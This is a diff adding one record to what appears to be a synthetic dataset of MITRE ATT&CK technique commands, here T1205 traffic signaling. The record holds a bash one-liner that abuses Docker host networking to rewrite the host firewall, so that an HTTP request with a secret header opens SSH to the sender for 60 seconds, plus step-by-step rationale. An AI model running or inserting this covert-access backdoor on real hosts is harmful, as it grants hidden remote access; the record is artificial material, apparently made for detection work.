@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "docker run --rm --net=host --cap-add=NET_ADMIN alpine sh -c \"apk add --no-cache iptables >/dev/null && iptables -I INPUT -p tcp --dport 80 -m string --string 'X-Open-SSH: 1' --algo bm -j LOG --log-prefix 'T1205_HTTP_SIG ' --log-level 4 && iptables -I INPUT -p tcp --dport 80 -m string --string 'X-Open-SSH: 1' --algo bm -m recent --name t1205_http --set && iptables -I INPUT -p tcp --dport 22 -m recent --name t1205_http --rcheck --seconds 60 --reap -j ACCEPT\"",
+  "explanation": "Installs iptables from a Docker container on the host network and creates traffic signaling via an HTTP header (application-specific). When an inbound HTTP request contains header 'X-Open-SSH: 1', the source IP is recorded and SSH (22) is temporarily opened for that IP. The signaling is logged for detection.",
+  "rationale_steps": [
+    "Use docker with --net=host and NET_ADMIN to modify host firewall from docker_group privileges.",
+    "Match application-layer HTTP header using iptables string match to act as a covert signal.",
+    "Log the signaling packet and place source in a 'recent' list; conditionally allow SSH for 60 seconds to that IP."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-4970f6eb-49d55e06",
+  "source_prompt_hash": "4970f6eb",
+  "timestamp_utc": "2025-09-30T03:38:51.523409Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
